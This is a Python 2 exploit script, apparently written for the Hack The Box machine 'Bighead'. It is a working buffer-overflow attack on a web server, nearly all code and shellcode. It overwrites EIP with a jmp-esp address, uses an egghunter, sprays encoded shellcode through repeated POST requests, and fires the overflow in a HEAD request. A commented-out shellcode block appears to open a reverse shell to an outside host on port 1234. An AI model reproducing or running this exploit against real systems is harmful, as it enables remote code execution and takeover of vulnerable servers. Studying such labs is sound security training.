import requests

'''exploit="";
exploit+="A"*74;
exploit+="B"*8
exploit+="c"*8;
exploit+="D"*50
print exploit'''

#625012f0  esp
#625012f2  eax

rhost="dev.bighead.htb"#"192.168.178.135"
rport="80"
url="http://"+rhost+":"+rport

'''buf =  "w00tw00t"
buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
buf += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
buf += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
buf += "\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
buf += "\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0e\x07\x68"
buf += "\x02\x00\x04\xd2\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
buf += "\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
buf += "\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
buf += "\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
buf += "\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
buf += "\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
buf += "\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
buf += "\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
buf += "\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
buf += "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
'''
buf="w00tw00t"
buf+="\xb8\xdd\xdd\x99\xb4\xda\xd6\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
buf+="\x52\x31\x43\x12\x03\x43\x12\x83\x36\x21\x7b\x41\x34\x32\xfe"
buf+="\xaa\xc4\xc3\x9f\x23\x21\xf2\x9f\x50\x22\xa5\x2f\x12\x66\x4a"
buf+="\xdb\x76\x92\xd9\xa9\x5e\x95\x6a\x07\xb9\x98\x6b\x34\xf9\xbb"
buf+="\xef\x47\x2e\x1b\xd1\x87\x23\x5a\x16\xf5\xce\x0e\xcf\x71\x7c"
buf+="\xbe\x64\xcf\xbd\x35\x36\xc1\xc5\xaa\x8f\xe0\xe4\x7d\x9b\xba"
buf+="\x26\x7c\x48\xb7\x6e\x66\x8d\xf2\x39\x1d\x65\x88\xbb\xf7\xb7"
buf+="\x71\x17\x36\x78\x80\x69\x7f\xbf\x7b\x1c\x89\xc3\x06\x27\x4e"
buf+="\xb9\xdc\xa2\x54\x19\x96\x15\xb0\x9b\x7b\xc3\x33\x97\x30\x87"
buf+="\x1b\xb4\xc7\x44\x10\xc0\x4c\x6b\xf6\x40\x16\x48\xd2\x09\xcc"
buf+="\xf1\x43\xf4\xa3\x0e\x93\x57\x1b\xab\xd8\x7a\x48\xc6\x83\x12"
buf+="\xbd\xeb\x3b\xe3\xa9\x7c\x48\xd1\x76\xd7\xc6\x59\xfe\xf1\x11"
buf+="\x9d\xd5\x46\x8d\x60\xd6\xb6\x84\xa6\x82\xe6\xbe\x0f\xab\x6c"
buf+="\x3e\xaf\x7e\x22\x6e\x1f\xd1\x83\xde\xdf\x81\x6b\x34\xd0\xfe"
buf+="\x8c\x37\x3a\x97\x27\xc2\xad\x92\xbd\xc2\x2a\xcb\xc3\xda\x35"
buf+="\xb0\x4d\x3c\x5f\xd6\x1b\x97\xc8\x4f\x06\x63\x68\x8f\x9c\x0e"
buf+="\xaa\x1b\x13\xef\x65\xec\x5e\xe3\x12\x1c\x15\x59\xb4\x23\x83"
buf+="\xf5\x5a\xb1\x48\x05\x14\xaa\xc6\x52\x71\x1c\x1f\x36\x6f\x07"
buf+="\x89\x24\x72\xd1\xf2\xec\xa9\x22\xfc\xed\x3c\x1e\xda\xfd\xf8"
buf+="\x9f\x66\xa9\x54\xf6\x30\x07\x13\xa0\xf2\xf1\xcd\x1f\x5d\x95"
buf+="\x88\x53\x5e\xe3\x94\xb9\x28\x0b\x24\x14\x6d\x34\x89\xf0\x79"
buf+="\x4d\xf7\x60\x85\x84\xb3\x81\x64\x0c\xce\x29\x31\xc5\x73\x34"
buf+="\xc2\x30\xb7\x41\x41\xb0\x48\xb6\x59\xb1\x4d\xf2\xdd\x2a\x3c"
buf+="\x6b\x88\x4c\x93\x8c\x99"



junk="\x90"*36
egg=""
egg+="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egg+="\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

eip="\xf0\x12\x50\x62"#625012f0  esp
pay=(junk+eip+egg).encode('hex')
#sparying 
print pay
for i in range(0,3):
    print "spray.."
    requests.post(url,data=buf)
#attack
print "attack.."
proxy={'http':'127.0.0.1:8080'}
requests.head(url+"/"+pay,proxies=proxy)
